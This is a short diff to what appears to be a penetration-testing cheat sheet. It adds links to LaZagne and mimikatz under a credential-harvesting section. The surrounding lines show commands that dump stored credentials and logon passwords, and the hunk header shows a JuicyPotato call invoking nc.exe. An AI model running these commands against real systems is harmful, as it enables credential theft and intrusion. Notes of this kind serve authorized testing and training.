@@ -749,6 +749,11 @@ juicy.exe  -l 12345 -p C:\Windows\system32\cmd.exe -a "/c c:\windows\Temp\nc.exe
 ## 5. Post Exploitation
 There might be some valuable information for pivoting over the network, post exploitation is necessary.
 ### Creds harvesting
+#### Useful tools
+[LaZagne.exe](https://github.com/AlessandroZ/LaZagne)
+
+[mimikatz.exe](https://github.com/ParrotSec/mimikatz/tree/master)
+
 ```powershell
 .\LaZagne.exe all -oN
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit" > .\sekurlsa_logonpassword.txt
